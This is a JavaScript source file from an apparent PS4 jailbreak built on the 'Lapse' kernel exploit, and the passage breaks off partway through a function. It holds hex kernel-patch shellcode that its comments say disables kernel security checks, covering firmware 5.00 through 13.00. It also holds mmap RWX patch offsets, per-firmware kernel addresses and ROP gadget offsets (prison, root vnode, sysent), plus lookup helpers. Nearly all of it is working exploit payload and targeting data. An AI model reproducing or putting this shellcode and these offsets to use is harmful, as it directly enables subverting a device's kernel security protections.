/** *** kernel_offset.js *****/

// PS4 Kernel Offsets for Lapse exploit
// Source: https://github.com/Helloyunho/yarpe/blob/main/payloads/lapse.py

// Kernel patch shellcode (hex strings) - patches security checks in kernel
// These are executed via kexec after jailbreak to enable full functionality
const kpatch_shellcode = {
  '5.00': 'B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BFEB04000041B890E9FFFF4881C2A0320100C681BD0A0000EBC6816DA31E00EBC681B1A31E00EBC6812DA41E00EBC68171A41E00EBC6810DA61E00EBC6813DAA1E00EBC681FDAA1E00EBC7819304000000000000C681C5040000EB668981BC0400006689B1B8040000C6817D4A0500EB6689B9F83A1A00664489812A7E2300C78150232B004831C0C3C68110D5130037C68113D5130037C78120C807010200000048899128C80701C7814CC80701010000000F20C0480D000001000F22C031C0C3',
  5.03: 'B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BFEB04000041B890E9FFFF4881C2A0320100C681BD0A0000EBC6817DA41E00EBC681C1A41E00EBC6813DA51E00EBC68181A51E00EBC6811DA71E00EBC6814DAB1E00EBC6810DAC1E00EBC7819304000000000000C681C5040000EB668981BC0400006689B1B8040000C6817D4A0500EB6689B9083C1A00664489813A7F2300C78120262B004831C0C3C68120D6130037C68123D6130037C78120C807010200000048899128C80701C7814CC80701010000000F20C0480D000001000F22C031C0C3',
  '5.50': 'B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C2CCAD0000C681ED0A0000EBC6810D594000EBC68151594000EBC681CD594000EBC681115A4000EBC681BD5B4000EBC6816D604000EBC6813D614000EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681CD070100EB6644898198EE0200664489890A390600C781300140004831C0C3C681D9253C0037C681DC253C0037C781D05E110102000000488991D85E1101C781FC5E1101010000000F20C0480D000001000F22C031C0C3',
  5.53: 'B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C2CCAD0000C681ED0A0000EBC6810D584000EBC68151584000EBC681CD584000EBC68111594000EBC681BD5A4000EBC6816D5F4000EBC6813D604000EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681CD070100EB6644898198EE0200664489890A390600C781300040004831C0C3C681D9243C0037C681DC243C0037C781D05E110102000000488991D85E1101C781FC5E1101010000000F20C0480D000001000F22C031C0C3',
  5.55: 'B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C2CCAD0000C681ED0A0000EBC681CD5B4000EBC681115C4000EBC6818D5C4000EBC681D15C4000EBC6817D5E4000EBC6812D634000EBC681FD634000EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681CD070100EB6644898198EE0200664489890A390600C781F00340004831C0C3C68199283C0037C6819C283C0037C781D0AE110102000000488991D8AE1101C781FCAE1101010000000F20C0480D000001000F22C031C0C3',
  5.56: 'B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C209EF0300C681DD0A0000EBC6814D461100EBC68191461100EBC6810D471100EBC68151471100EBC681FD481100EBC681AD4D1100EBC6817D4E1100EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681ED900200EB6644898158223500664489895AF62700C78110A801004831C0C3C6816D02240037C6817002240037C78150B711010200000048899158B71101C7817CB71101010000000F20C0480D000001000F22C031C0C3',
  '6.00': 'B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C209EF0300C681DD0A0000EBC6814D461100EBC68191461100EBC6810D471100EBC68151471100EBC681FD481100EBC681AD4D1100EBC6817D4E1100EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681ED900200EB6644898158223500664489895AF62700C78110A801004831C0C3C6816D02240037C6817002240037C78150B711010200000048899158B71101C7817CB71101010000000F20C0480D000001000F22C031C0C3',
  '6.20': 'B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C2AEBC0200C681DD0A0000EBC6814D461100EBC68191461100EBC6810D471100EBC68151471100EBC681FD481100EBC681AD4D1100EBC6817D4E1100EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681ED900200EB6644898178223500664489897AF62700C78110A801004831C0C3C6816D02240037C6817002240037C78150F711010200000048899158F71101C7817CF71101010000000F20C0480D000001000F22C031C0C3',
  '6.50': 'B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BF90E9FFFF41B8EB0000006689810EC5630041B9EB00000041BAEB04000041BB90E9FFFFB890E9FFFF4881C24DA31500C681CD0A0000EBC6814D113C00EBC68191113C00EBC6810D123C00EBC68151123C00EBC681FD133C00EBC681AD183C00EBC6817D193C00EB6689B10FCE6300C78190040000000000006689B9C604000066448981BD04000066448989B9040000C68127BB1000EB66448991081A4500664489991E801D00668981AA851D00C781209F41004831C0C3C6817AB50A0037C6817DB50A0037C78110D211010200000048899118D21101C7813CD21101010000000F20C0480D000001000F22C031C0C3',
  '6.70': 'B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BF90E9FFFF41B8EB000000668981CEC8630041B9EB00000041BAEB04000041BB90E9FFFFB890E9FFFF4881C25DCF0900C681CD0A0000EBC681FD143C00EBC68141153C00EBC681BD153C00EBC68101163C00EBC681AD173C00EBC6815D1C3C00EBC6812D1D3C00EB6689B1CFD16300C78190040000000000006689B9C604000066448981BD04000066448989B9040000C681D7BE1000EB66448991B81D450066448999CE831D006689815A891D00C781D0A241004831C0C3C6817AB50A0037C6817DB50A0037C78110E211010200000048899118E21101C7813CE21101010000000F20C0480D000001000F22C031C0C3',
  '7.00': 'B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BF90E9FFFF41B8EB000000668981CEAC630041B9EB00000041BAEB04000041BB90E9FFFFB890E9FFFF4881C2D2AF0600C681CD0A0000EBC6818DEF0200EBC681D1EF0200EBC6814DF00200EBC68191F00200EBC6813DF20200EBC681EDF60200EBC681BDF70200EB6689B1EFB56300C78190040000000000006689B9C604000066448981BD04000066448989B9040000C681777B0800EB66448991084C260066448999C14E09006689817B540900C781202C2F004831C0C3C68136231D0037C68139231D0037C781705812010200000048899178581201C7819C581201010000000F20C0480D000001000F22C031C0C3',
  '7.50': 'B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BF90E9FFFF41B8EB0000006689819473630041B9EB00000041BAEB04000041BB90E9FFFFB890E9FFFF4881C282F60100C681DD0A0000EBC6814DF72800EBC68191F72800EBC6810DF82800EBC68151F82800EBC681FDF92800EBC681ADFE2800EBC6817DFF2800EB6689B1CF7C6300C78190040000000000006689B9C604000066448981BD04000066448989B9040000C68127A33700EB66448991C814300066448999041E4500668981C4234500C781309A02004831C0C3C6817DB10D0037C68180B10D0037C781502512010200000048899158251201C7817C251201010000000F20C0480D000001000F22C031C0C3',
  '8.00': 'B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BFEB00000041B8EB00000041B9EB04000041BA90E9FFFF4881C2DC600E0066898154D26200C681CD0A0000EBC6810DE12500EBC68151E12500EBC681CDE12500EBC68111E22500EBC681BDE32500EBC6816DE82500EBC6813DE92500EB6689B13FDB6200C7819004000000000000C681C2040000EB6689B9B904000066448981B5040000C68196D63400EB664489898BC63E0066448991848D3100C6813F953100EBC781C05109004831C0C3C6813AD00F0037C6813DD00F0037C781E0C60F0102000000488991E8C60F01C7810CC70F01010000000F20C0480D000001000F22C031C0C3',
  '8.50': 'B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BFEB00000041B8EB00000041B9EB04000041BA90E9FFFF4881C24D7F0C0066898174466200C681CD0A0000EBC6813D403A00EBC68181403A00EBC681FD403A00EBC68141413A00EBC681ED423A00EBC6819D473A00EBC6816D483A00EB6689B15F4F6200C7819004000000000000C681C2040000EB6689B9B904000066448981B5040000C681D6F32200EB66448989DBD614006644899174740100C6812F7C0100EBC78140D03A004831C0C3C681EA26080037C681ED26080037C781D0C70F0102000000488991D8C70F01C781FCC70F01010000000F20C0480D000001000F22C031C0C3',
  '9.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2edc5040066898174686200c681cd0a0000ebc681fd132700ebc68141142700ebc681bd142700ebc68101152700ebc681ad162700ebc6815d1b2700ebc6812d1c2700eb6689b15f716200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000eb664489898b0b080066448991c4ae2300c6817fb62300ebc781401b22004831c0c3c6812a63160037c6812d63160037c781200510010200000048899128051001c7814c051001010000000f20c0480d000001000f22c031c0c3',
  9.03: 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c29b30050066898134486200c681cd0a0000ebc6817d102700ebc681c1102700ebc6813d112700ebc68181112700ebc6812d132700ebc681dd172700ebc681ad182700eb6689b11f516200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000eb664489898b0b08006644899194ab2300c6814fb32300ebc781101822004831c0c3c681da62160037c681dd62160037c78120c50f010200000048899128c50f01c7814cc50f01010000000f20c0480d000001000f22c031c0c3',
  '9.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2ad580100668981e44a6200c681cd0a0000ebc6810d1c2000ebc681511c2000ebc681cd1c2000ebc681111d2000ebc681bd1e2000ebc6816d232000ebc6813d242000eb6689b1cf536200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68136a51f00eb664489893b6d19006644899124f71900c681dffe1900ebc781601901004831c0c3c6817a2d120037c6817d2d120037c78100950f010200000048899108950f01c7812c950f01010000000f20c0480d000001000f22c031c0c3',
  '10.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2f166000066898164e86100c681cd0a0000ebc6816d2c4700ebc681b12c4700ebc6812d2d4700ebc681712d4700ebc6811d2f4700ebc681cd334700ebc6819d344700eb6689b14ff16100c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68156772600eb664489897b20390066448991a4fa1800c6815f021900ebc78140ea1b004831c0c3c6819ad50e0037c6819dd50e0037c781a02f100102000000488991a82f1001c781cc2f1001010000000f20c0480d000001000f22c031c0c3',
  '10.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb00000066898113302100b8eb04000041b9eb00000041baeb000000668981ecb2470041bbeb000000b890e9ffff4881c22d0c05006689b1233021006689b94330210066448981b47d6200c681cd0a0000ebc681bd720d00ebc68101730d00ebc6817d730d00ebc681c1730d00ebc6816d750d00ebc6811d7a0d00ebc681ed7a0d00eb664489899f866200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681c6c10800eb668981d42a2100c7818830210090e93c01c78160ab2d004831c0c3c6812ac4190037c6812dc4190037c781d02b100102000000488991d82b1001c781fc2b1001010000000f20c0480d000001000f22c031c0c3',
  '11.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981334c1e00b8eb04000041b9eb00000041baeb000000668981ecc8350041bbeb000000b890e9ffff4881c2611807006689b1434c1e006689b9634c1e0066448981643f6200c681cd0a0000ebc6813ddd2d00ebc68181dd2d00ebc681fddd2d00ebc68141de2d00ebc681eddf2d00ebc6819de42d00ebc6816de52d00eb664489894f486200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126154300eb668981f4461e00c781a84c1e0090e93c01c781e08c08004831c0c3c6816a62150037c6816d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3',
  11.02: 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981534c1e00b8eb04000041b9eb00000041baeb0000006689810cc9350041bbeb000000b890e9ffff4881c2611807006689b1634c1e006689b9834c1e0066448981043f6200c681cd0a0000ebc6815ddd2d00ebc681a1dd2d00ebc6811dde2d00ebc68161de2d00ebc6810de02d00ebc681bde42d00ebc6818de52d00eb66448989ef476200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681b6144300eb66898114471e00c781c84c1e0090e93c01c781e08c08004831c0c3c6818a62150037c6818d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3',
  '11.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981acbe2f0041bbeb000000b890e9ffff4881c2150307006689b1b3761b006689b9d3761b0066448981b4786200c681cd0a0000ebc681edd22b00ebc68131d32b00ebc681add32b00ebc681f1d32b00ebc6819dd52b00ebc6814dda2b00ebc6811ddb2b00eb664489899f816200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681a6123900eb66898164711b00c78118771b0090e93c01c78120d63b004831c0c3c6813aa61f0037c6813da61f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3',
  '12.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981ecc02f0041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900eb66898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3',
  '12.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900ebc7812ec12f0000000000668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3',
  '13.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981847b6200c681cd0a0000ebc6812dd42b00ebc68171d42b00ebc681edd42b00ebc68131d52b00ebc681ddd62b00ebc6818ddb2b00ebc6815ddc2b00eb664489896f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68146153900ebc7814ec12f0000000000668981a4711b00c78158771b0090e93c01c781c0d83b004831c0c3c6817aa71f0037c6817da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3',
}

// Mmap RWX patch offsets per firmware (for verification)
// These are the offsets where 0x33 is patched to 0x37
const kpatch_mmap_offsets = {
  // TODO: missing 5.00 to 8.50
  5.55: [0x3c2899, 0x3c289c],   // TODO: verify
  5.56: [0x24026d, 0x240270],   // TODO: verify
  '6.00': [0x24026d, 0x240270],   // TODO: verify
  '6.20': [0x24026d, 0x240270],   // TODO: verify
  '6.50': [0xab57a, 0xab57d],     // TODO: verify
  '6.70': [0xab57a, 0xab57d],     // TODO: verify
  '7.00': [0x1d2336, 0x1d2339],   // TODO: verify
  '7.50': [0xdb17d, 0xdb180],     // TODO: verify
  '8.00': [0xfd03a, 0xfd03d],     // TODO: verify
  '8.50': [0x826ea, 0x826ed],     // TODO: verify
  '9.00': [0x16632a, 0x16632d],   // TODO: verify
  9.03: [0x1662da, 0x1662dd],   // TODO: verify
  '9.50': [0x122d7a, 0x122d7d],   // TODO: verify
  '10.00': [0xed59a, 0xed59d],    // TODO: verify
  '10.50': [0x19c42a, 0x19c42d],  // TODO: verify
  '11.00': [0x15626a, 0x15626d],
  11.02: [0x15628a, 0x15628d],
  '11.50': [0x1fa63a, 0x1fa63d],
  '12.00': [0x1fa71a, 0x1fa71d],
  // TODO: add mmap offsets for 12.50, 12.52, 13.00
}

const shellcode_fw_map = {
  '5.00': '5.00',
  5.01: '5.00',
  5.03: '5.03',
  5.05: '5.03',
  5.07: '5.03',
  '5.50': '5.50',
  5.53: '5.53',
  5.55: '5.55',
  5.56: '5.56',
  '6.00': '6.00',
  6.02: '6.00',
  '6.20': '6.20',
  '6.50': '6.50',
  6.51: '6.50',
  '6.70': '6.70',
  6.71: '6.70',
  6.72: '6.70',
  '7.00': '7.00',
  7.01: '7.00',
  7.02: '7.00',
  '7.50': '7.50',
  7.51: '7.50',
  7.55: '7.50',
  '8.00': '8.00',
  8.01: '8.00',
  8.03: '8.00',
  '8.50': '8.50',
  8.52: '8.50',
  '9.00': '9.00',
  9.03: '9.03',
  9.04: '9.03',
  '9.50': '9.50',
  9.51: '9.50',
  '9.60': '9.50',
  '10.00': '10.00',
  10.01: '10.00',
  '10.50': '10.50',
  '10.70': '10.50',
  10.71: '10.50',
  '11.00': '11.00',
  11.02: '11.02',
  '11.50': '11.50',
  11.52: '11.50',
  '12.00': '12.00',
  12.02: '12.00',
  '12.50': '12.50',
  12.52: '12.50',
  '13.00': '13.00',
}

function get_mmap_patch_offsets (fw_version) {
  // Normalize version
  var lookup = fw_version
  if (fw_version === '9.04') lookup = '9.03'
  else if (fw_version === '9.51' || fw_version === '9.60') lookup = '9.50'
  else if (fw_version === '10.01') lookup = '10.00'
  else if (fw_version === '10.70' || fw_version === '10.71') lookup = '10.50'
  else if (fw_version === '11.52') lookup = '11.50'
  else if (fw_version === '12.02') lookup = '12.00'

  return kpatch_mmap_offsets[lookup] || null
}

// Helper to convert hex string to byte array
function hexToBytes (hex) {
  const bytes = []
  for (var i = 0; i < hex.length; i += 2) {
    bytes.push(parseInt(hex.substr(i, 2), 16))
  }
  return bytes
}

// Get kernel patch shellcode for firmware version
function get_kpatch_shellcode (fw_version) {
  const hex = kpatch_shellcode[shellcode_fw_map[fw_version]]
  if (!hex) {
    return null
  }
  return hexToBytes(hex)
}

// Firmware-specific offsets for PS4

offset_ps4_5_00 = {             // AND 5.01
  EVF_OFFSET: 0X7B3ED4,
  PRISON0: 0X10986A0,
  ROOTVNODE: 0X22C19F0,
  SYSENT_661: 0X1084200,
  JMP_RSI_GADGET: 0X13460
}

offset_ps4_5_03 = {
  EVF_OFFSET: 0X7B42E4,
  PRISON0: 0X10986A0,
  ROOTVNODE: 0X22C1A70,
  SYSENT_661: 0X1084200,
  JMP_RSI_GADGET: 0X13460
}

offset_ps4_5_05 = {             // AND 5.07
  EVF_OFFSET: 0X7B42A4,
  PRISON0: 0X10986A0,
  ROOTVNODE: 0X22C1A70,
  SYSENT_661: 0X1084200,
  JMP_RSI_GADGET: 0X13460
}

offset_ps4_5_50 = {
  EVF_OFFSET: 0X80EF12,
  PRISON0: 0X1134180,
  ROOTVNODE: 0X22EF570,
  SYSENT_661: 0X111D8B0,
  JMP_RSI_GADGET: 0XAF8C
}

offset_ps4_5_53 = {
  EVF_OFFSET: 0X80EDE2,
  PRISON0: 0X1134180,
  ROOTVNODE: 0X22EF570,
  SYSENT_661: 0X111D8B0,
  JMP_RSI_GADGET: 0XAF8C
}

offset_ps4_5_55 = {
  EVF_OFFSET: 0X80F482,
  PRISON0: 0X1139180,
  ROOTVNODE: 0X22F3570,
  SYSENT_661: 0X11228B0,
  JMP_RSI_GADGET: 0XAF8C
}

offset_ps4_5_56 = {
  EVF_OFFSET: 0X7C8971,
  PRISON0: 0X1139180,
  ROOTVNODE: 0X22F3570,
  SYSENT_661: 0X1123130,
  JMP_RSI_GADGET: 0X3F0C9
}

offset_ps4_6_00 = {             // AND 6.02
  EVF_OFFSET: 0X7C8971,
  PRISON0: 0X1139458,
  ROOTVNODE: 0X21BFAC0,
  SYSENT_661: 0X1123130,
  JMP_RSI_GADGET: 0X3F0C9
}

offset_ps4_6_20 = {
  EVF_OFFSET: 0X7C8E31,
  PRISON0: 0X113D458,
  ROOTVNODE: 0X21C3AC0,
  SYSENT_661: 0X1127130,
  JMP_RSI_GADGET: 0X2BE6E
}

offset_ps4_6_50 = {
  EVF_OFFSET: 0X7C6019,
  PRISON0: 0X113D4F8,
  ROOTVNODE: 0X2300320,
  SYSENT_661: 0X1124BF0,
  JMP_RSI_GADGET: 0X15A50D
}

offset_ps4_6_51 = {
  EVF_OFFSET: 0X7C6099,
  PRISON0: 0X113D4F8,
  ROOTVNODE: 0X2300320,
  SYSENT_661: 0X1124BF0,
  JMP_RSI_GADGET: 0X15A50D
}

offset_ps4_6_70 = {             // AND 6.71, 6.72
  EVF_OFFSET: 0X7C7829,
  PRISON0: 0X113E518,
  ROOTVNODE: 0X2300320,
  SYSENT_661: 0X1125BF0,
  JMP_RSI_GADGET: 0X9D11D
}

offset_ps4_7_00 = {             // AND 7.01, 7.02
  EVF_OFFSET: 0X7F92CB,
  PRISON0: 0X113E398,
  ROOTVNODE: 0X22C5750,
  SYSENT_661: 0X112D250,
  JMP_RSI_GADGET: 0X6B192
}

offset_ps4_7_50 = {
  EVF_OFFSET: 0X79A92E,
  PRISON0: 0X113B728,
  ROOTVNODE: 0X1B463E0,
  SYSENT_661: 0X1129F30,
  JMP_RSI_GADGET: 0X1F842
}

offset_ps4_7_51 = {             // AND 7.55
  EVF_OFFSET: 0X79A96E,
  PRISON0: 0X113B728,
  ROOTVNODE: 0X1B463E0,
  SYSENT_661: 0X1129F30,
  JMP_RSI_GADGET: 0X1F842
}

offset_ps4_8_00 = {             // AND 8.01, 8.02, 8.03
  EVF_OFFSET: 0X7EDCFF,
  PRISON0: 0X111A7D0,
  ROOTVNODE: 0X1B8C730,
  SYSENT_661: 0X11040C0,
  JMP_RSI_GADGET: 0XE629C
}

offset_ps4_8_50 = {             // AND 8.52
  EVF_OFFSET: 0X7DA91C,
  PRISON0: 0X111A8F0,
  ROOTVNODE: 0X1C66150,
  SYSENT_661: 0X11041B0,
  JMP_RSI_GADGET: 0XC810D
}

offset_ps4_9_00 = {
  EVF_OFFSET: 0x7F6F27,
  PRISON0: 0x111F870,
  ROOTVNODE: 0x21EFF20,
  TARGET_ID_OFFSET: 0x221688D,
  SYSENT_661: 0x1107F00,
  JMP_RSI_GADGET: 0x4C7AD,
  KL_LOCK: 0x3977F0,

}

offset_ps4_9_03 = {
  EVF_OFFSET: 0x7F4CE7,
  PRISON0: 0x111B840,
  ROOTVNODE: 0x21EBF20,
  TARGET_ID_OFFSET: 0x221288D,
  SYSENT_661: 0x1103F00,
  JMP_RSI_GADGET: 0x5325B,
  KL_LOCK: 0x3959F0,
}

offset_ps4_9_50 = {
  EVF_OFFSET: 0x769A88,
  PRISON0: 0x11137D0,
  ROOTVNODE: 0x21A6C30,
  TARGET_ID_OFFSET: 0x221A40D,
  SYSENT_661: 0x1100EE0,
  JMP_RSI_GADGET: 0x15A6D,
  KL_LOCK: 0x85EE0,
}

offset_ps4_10_00 = {
  EVF_OFFSET: 0x7B5133,
  PRISON0: 0x111B8B0,
  ROOTVNODE: 0x1B25BD0,
  TARGET_ID_OFFSET: 0x1B9E08D,
  SYSENT_661: 0x110A980,
  JMP_RSI_GADGET: 0x68B1,
  KL_LOCK: 0x45B10,
}

offset_ps4_10_50 = {
  EVF_OFFSET: 0x7A7B14,
  PRISON0: 0x111B910,
  ROOTVNODE: 0x1BF81F0,
  TARGET_ID_OFFSET: 0x1BE460D,
  SYSENT_661: 0x110A5B0,
  JMP_RSI_GADGET: 0x50DED,
  KL_LOCK: 0x25E330,
}

offset_ps4_11_00 = {
  EVF_OFFSET: 0x7FC26F,
  PRISON0: 0x111F830,
  ROOTVNODE: 0x2116640,
  TARGET_ID_OFFSET: 0x221C60D,
  SYSENT_661: 0x1109350,
  JMP_RSI_GADGET: 0x71A21,
  KL_LOCK: 0x58F10,
}

offset_ps4_11_02 = {
  EVF_OFFSET: 0x7FC22F,
  PRISON0: 0x111F830,
  ROOTVNODE: 0x2116640,
  TARGET_ID_OFFSET: 0x221C60D,
  SYSENT_661: 0x1109350,
  JMP_RSI_GADGET: 0x71A21,
  KL_LOCK: 0x58F10,
}

offset_ps4_11_50 = {
  EVF_OFFSET: 0x784318,
  PRISON0: 0x111FA18,
  ROOTVNODE: 0x2136E90,
  TARGET_ID_OFFSET: 0x21CC60D,
  SYSENT_661: 0x110A760,
  JMP_RSI_GADGET: 0x704D5,
  KL_LOCK: 0xE6C20,
}

offset_ps4_12_00 = {            // AND 12.02
  EVF_OFFSET: 0x784798,
  PRISON0: 0x111FA18,
  ROOTVNODE: 0x2136E90,
  TARGET_ID_OFFSET: 0x21CC60D,
  SYSENT_661: 0x110A760,
  JMP_RSI_GADGET: 0x47B31,
  KL_LOCK: 0xE6C20,
}

offset_ps4_12_50 = {        // AND 12.52, 13.00
  EVF_OFFSET: 0x0,        // Missing but not needed in netctrl
  PRISON0: 0x111FA18,
  ROOTVNODE: 0x2136E90,
  TARGET_ID_OFFSET: 0x0,  // Missing but not needed in netctrl
  SYSENT_661: 0x110A760,
  JMP_RSI_GADGET: 0x47B31,
  KL_LOCK: 0xE6C20,
}

// Map firmware versions to offset objects
ps4_kernel_offset_list = {
  '5.00': offset_ps4_5_00,
  5.01: offset_ps4_5_00,
  5.03: offset_ps4_5_03,
  5.05: offset_ps4_5_05,
  5.07: offset_ps4_5_05,
  '5.50': offset_ps4_5_50,
  5.53: offset_ps4_5_53,
  5.55: offset_ps4_5_55,
  5.56: offset_ps4_5_56,
  '6.00': offset_ps4_6_00,
  6.02: offset_ps4_6_00,
  '6.20': offset_ps4_6_20,
  '6.50': offset_ps4_6_50,
  6.51: offset_ps4_6_51,
  '6.70': offset_ps4_6_70,
  6.71: offset_ps4_6_70,
  6.72: offset_ps4_6_70,
  '7.00': offset_ps4_7_00,
  7.01: offset_ps4_7_00,
  7.02: offset_ps4_7_00,
  '7.50': offset_ps4_7_50,
  7.51: offset_ps4_7_51,
  7.55: offset_ps4_7_51,
  '8.00': offset_ps4_8_00,
  8.01: offset_ps4_8_00,
  8.02: offset_ps4_8_00,
  8.03: offset_ps4_8_00,
  '8.50': offset_ps4_8_50,
  8.52: offset_ps4_8_50,
  '9.00': offset_ps4_9_00,
  9.03: offset_ps4_9_03,
  9.04: offset_ps4_9_03,
  '9.50': offset_ps4_9_50,
  9.51: offset_ps4_9_50,
  '9.60': offset_ps4_9_50,
  '10.00': offset_ps4_10_00,
  10.01: offset_ps4_10_00,
  '10.50': offset_ps4_10_50,
  '10.70': offset_ps4_10_50,
  10.71: offset_ps4_10_50,
  '11.00': offset_ps4_11_00,
  11.02: offset_ps4_11_02,
  '11.50': offset_ps4_11_50,
  11.52: offset_ps4_11_50,
  '12.00': offset_ps4_12_00,
  12.02: offset_ps4_12_00,
  '12.50': offset_ps4_12_50,
  12.51: offset_ps4_12_50,
  '13.00': offset_ps4_12_50,
}

kernel_offset = null // Global

function get_kernel_offset (FW_VERSION) {
  const fw_offsets = ps4_kernel_offset_list[FW_VERSION]

  if (!fw_offsets) {
    throw new Error('Unsupported PS4 firmware version: ' + FW_VERSION)
  }

  kernel_offset = fw_offsets

  // PS4-specific proc structure offsets
  kernel_offset.PROC_FD = 0x48
  kernel_offset.PROC_PID = 0xB0       // PS4 = 0xB0, PS5 = 0xBC
  kernel_offset.PROC_VM_SPACE = 0x200
  kernel_offset.PROC_UCRED = 0x40
  kernel_offset.PROC_COMM = -1        // Found dynamically
  kernel_offset.PROC_SYSENT = -1      // Found dynamically

  // filedesc - PS4 different from PS5
  kernel_offset.FILEDESC_OFILES = 0x0  // PS4 = 0x0, PS5 = 0x8
  kernel_offset.SIZEOF_OFILES = 0x8    // PS4 = 0x8, PS5 = 0x30

  // vmspace structure
  kernel_offset.VMSPACE_VM_PMAP = -1

  // pmap structure
  kernel_offset.PMAP_CR3 = 0x28

  // socket/net - PS4 specific
  kernel_offset.SO_PCB = 0x18
  kernel_offset.INPCB_PKTOPTS = 0x118  // PS4 = 0x118, PS5 = 0x120

  // pktopts structure - PS4 specific
